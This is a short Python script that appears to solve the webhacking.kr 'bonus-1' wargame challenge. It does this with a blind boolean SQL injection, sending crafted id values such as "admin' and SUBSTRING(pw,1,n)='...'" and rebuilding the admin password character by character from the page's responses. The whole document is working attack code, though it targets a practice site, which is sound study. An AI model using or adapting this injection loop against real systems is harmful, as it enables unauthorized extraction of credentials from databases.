import requests
import string
import urllib.parse

url = 'https://webhacking.kr/challenge/bonus-1/index.php?'
result = ""
LEN_PASS = 36
count = 1
while count <= LEN_PASS:
  for i in list(string.ascii_lowercase + "_"):
    print(f"Trying {result+i}")
    id = urllib.parse.quote(f"admin' and SUBSTRING(pw,1,{count})='{result + i}' or '1'='0")
    payload = f"id={id}&pw=1"
    print(payload)
    r = requests.get(url+payload)
    if ("wrong password" in r.text):
      count += 1
      result += i

print(result)